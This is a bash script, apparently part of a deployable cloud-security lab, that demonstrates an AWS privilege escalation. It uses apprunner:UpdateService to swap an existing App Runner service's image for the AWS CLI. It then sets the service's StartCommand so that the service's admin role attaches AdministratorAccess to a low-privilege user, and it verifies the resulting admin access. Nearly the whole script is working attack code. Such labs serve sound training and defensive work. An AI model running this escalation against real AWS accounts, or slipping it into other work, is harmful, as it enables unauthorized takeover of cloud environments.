#!/bin/bash

# Demo script for apprunner:UpdateService privilege escalation
# This script demonstrates how a user with apprunner:UpdateService can exploit an existing App Runner service with an admin role

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-apprunner-002-to-admin-starting-user"
TARGET_SERVICE_NAME="pl-prod-apprunner-002-to-admin-target-service"
TARGET_ROLE="pl-prod-apprunner-002-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}App Runner UpdateService Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_apprunner_002_apprunner_updateservice.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Describe the existing App Runner service and backup configuration
echo -e "${YELLOW}Step 5: Examining the existing App Runner service${NC}"

# List services to find the service ARN
SERVICE_ARN=$(aws apprunner list-services \
    --region "$AWS_REGION" \
    --query "ServiceSummaryList[?ServiceName=='${TARGET_SERVICE_NAME}'].ServiceArn" \
    --output text 2>&1)
LIST_EXIT_CODE=$?

if [ $LIST_EXIT_CODE -ne 0 ]; then
    echo -e "${RED}Error: Failed to list App Runner services${NC}"
    echo "$SERVICE_ARN"
    exit 1
fi

if [ -z "$SERVICE_ARN" ] || [ "$SERVICE_ARN" = "None" ]; then
    echo -e "${RED}Error: Could not find service: $TARGET_SERVICE_NAME${NC}"
    exit 1
fi

echo "Service ARN: $SERVICE_ARN"
echo ""

# Describe the service to get current configuration
echo "Getting current service configuration..."
SERVICE_DETAILS=$(aws apprunner describe-service \
    --region $AWS_REGION \
    --service-arn "$SERVICE_ARN" \
    --output json 2>&1)
DESCRIBE_EXIT_CODE=$?

if [ $DESCRIBE_EXIT_CODE -ne 0 ]; then
    echo -e "${RED}Error: Failed to describe App Runner service${NC}"
    echo "$SERVICE_DETAILS"
    exit 1
fi

# Display current configuration
CURRENT_IMAGE=$(echo "$SERVICE_DETAILS" | jq -r '.Service.SourceConfiguration.ImageRepository.ImageIdentifier')
CURRENT_PORT=$(echo "$SERVICE_DETAILS" | jq -r '.Service.SourceConfiguration.ImageRepository.ImageConfiguration.Port // "80"')
CURRENT_START_COMMAND=$(echo "$SERVICE_DETAILS" | jq -r '.Service.SourceConfiguration.ImageRepository.ImageConfiguration.StartCommand // "null"')
INSTANCE_ROLE_ARN=$(echo "$SERVICE_DETAILS" | jq -r '.Service.InstanceConfiguration.InstanceRoleArn')

echo "Current configuration:"
echo "  Image: $CURRENT_IMAGE"
echo "  Port: $CURRENT_PORT"
echo "  StartCommand: $CURRENT_START_COMMAND"
echo "  Instance Role: $INSTANCE_ROLE_ARN"
echo ""

# Check if the role is the admin role
if [[ $INSTANCE_ROLE_ARN == *"$TARGET_ROLE"* ]]; then
    echo -e "${BLUE}✓ Service is running with privileged role: $TARGET_ROLE${NC}"
    echo "This role has AdministratorAccess - we can exploit this!"
else
    echo -e "${YELLOW}⚠ Warning: Service is not running with expected admin role${NC}"
    echo "Expected: $TARGET_ROLE"
    echo "Got: $INSTANCE_ROLE_ARN"
fi
echo ""

# Backup the original configuration
echo "Backing up original service configuration..."
echo "$SERVICE_DETAILS" | jq '.Service | {
    ServiceArn: .ServiceArn,
    SourceConfiguration: .SourceConfiguration,
    InstanceConfiguration: .InstanceConfiguration
}' > /tmp/apprunner-original-config.json

echo -e "${GREEN}✓ Backed up original configuration to /tmp/apprunner-original-config.json${NC}\n"

# Step 6: Update the App Runner service with malicious configuration
echo -e "${YELLOW}Step 6: Updating App Runner service with exploitation payload${NC}"
echo "We will:"
echo "  1. Change the container image to AWS CLI"
echo "  2. Set StartCommand to grant us admin access"
echo "  3. Keep the existing admin role (${TARGET_ROLE})"
echo ""

# Create the update configuration JSON
UPDATE_CONFIG=$(cat <<'EOF'
{
  "ServiceArn": "SERVICE_ARN_PLACEHOLDER",
  "SourceConfiguration": {
    "ImageRepository": {
      "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
      "ImageRepositoryType": "ECR_PUBLIC",
      "ImageConfiguration": {
        "Port": "PORT_PLACEHOLDER",
        "StartCommand": "iam attach-user-policy --user-name STARTING_USER_PLACEHOLDER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    "AutoDeploymentsEnabled": false
  }
}
EOF
)

# Replace placeholders with actual values
UPDATE_CONFIG="${UPDATE_CONFIG//SERVICE_ARN_PLACEHOLDER/$SERVICE_ARN}"
UPDATE_CONFIG="${UPDATE_CONFIG//PORT_PLACEHOLDER/$CURRENT_PORT}"
UPDATE_CONFIG="${UPDATE_CONFIG//STARTING_USER_PLACEHOLDER/$STARTING_USER}"

# Save the JSON to a temporary file
echo "$UPDATE_CONFIG" > /tmp/apprunner-update-config.json

echo "Updating service to execute privilege escalation payload..."
UPDATE_RESULT=$(aws apprunner update-service \
    --region $AWS_REGION \
    --cli-input-json file:///tmp/apprunner-update-config.json \
    --output json 2>&1)
UPDATE_EXIT_CODE=$?

if [ $UPDATE_EXIT_CODE -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated App Runner service${NC}"
    echo "Service will redeploy with the new configuration"
else
    echo -e "${RED}Error: Failed to update App Runner service (exit code: $UPDATE_EXIT_CODE)${NC}"
    echo "$UPDATE_RESULT"
    rm -f /tmp/apprunner-update-config.json
    exit 1
fi
echo ""

# Step 7: Wait for App Runner service update to complete
echo -e "${YELLOW}Step 7: Waiting for App Runner service update to complete${NC}"
echo "This may take 3-5 minutes as App Runner:"
echo "  - Downloads the new container image (AWS CLI)"
echo "  - Deploys the updated service"
echo "  - Executes the StartCommand (which grants us admin)"
echo ""

MAX_WAIT=420  # 7 minutes
WAIT_TIME=0
SERVICE_RUNNING=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check service status
    SERVICE_STATUS=$(aws apprunner describe-service \
        --region $AWS_REGION \
        --service-arn "$SERVICE_ARN" \
        --query 'Service.Status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "Service status: $SERVICE_STATUS (waited ${WAIT_TIME}s)"

    if [ "$SERVICE_STATUS" = "RUNNING" ]; then
        echo -e "${GREEN}✓ App Runner service is running${NC}\n"
        SERVICE_RUNNING=true
        break
    elif [ "$SERVICE_STATUS" = "UPDATE_FAILED" ]; then
        echo -e "${RED}Error: Service update failed${NC}"
        echo "You can check the service details with:"
        echo "  aws apprunner describe-service --service-arn $SERVICE_ARN --region $AWS_REGION"
        exit 1
    fi

    sleep 15
    WAIT_TIME=$((WAIT_TIME + 15))
done

if [ "$SERVICE_RUNNING" = false ]; then
    echo -e "${YELLOW}Warning: Service may not be fully running yet (status: $SERVICE_STATUS)${NC}"
    echo "Proceeding to check if the privilege escalation completed..."
    echo ""
fi

# Step 8: Wait for IAM policy propagation
echo -e "${YELLOW}Step 8: Waiting for IAM policy changes to propagate${NC}"
echo "The App Runner service should have attached AdministratorAccess to our user..."
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15
echo -e "${GREEN}✓ Policy propagation wait complete${NC}\n"

# Step 9: Verify admin access
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "The service may still be deploying. Service ARN: $SERVICE_ARN"
    echo "You can check the service status with:"
    echo "  aws apprunner describe-service --service-arn $SERVICE_ARN --region $AWS_REGION"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Discovered existing App Runner service with admin role"
echo "3. Updated service to change container image to AWS CLI"
echo "4. Set StartCommand to execute with admin permissions"
echo "5. StartCommand attached AdministratorAccess policy to $STARTING_USER"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (apprunner:UpdateService)"
echo -e "  → Updated existing App Runner Service ($TARGET_SERVICE_NAME)"
echo -e "  → Service runs with $TARGET_ROLE (Admin)"
echo -e "  → StartCommand executes with admin permissions"
echo -e "  → Grants admin to $STARTING_USER → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified App Runner Service: $TARGET_SERVICE_NAME"
echo "- Service ARN: $SERVICE_ARN"
echo "- Modified Policy: AdministratorAccess attached to $STARTING_USER"
echo "- Original configuration backed up in: /tmp/apprunner-original-config.json"

echo -e "\n${RED}⚠ Warning: The App Runner service has been modified${NC}"
echo -e "${RED}⚠ App Runner services incur charges while active${NC}"
echo -e "${RED}⚠ The AdministratorAccess policy is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
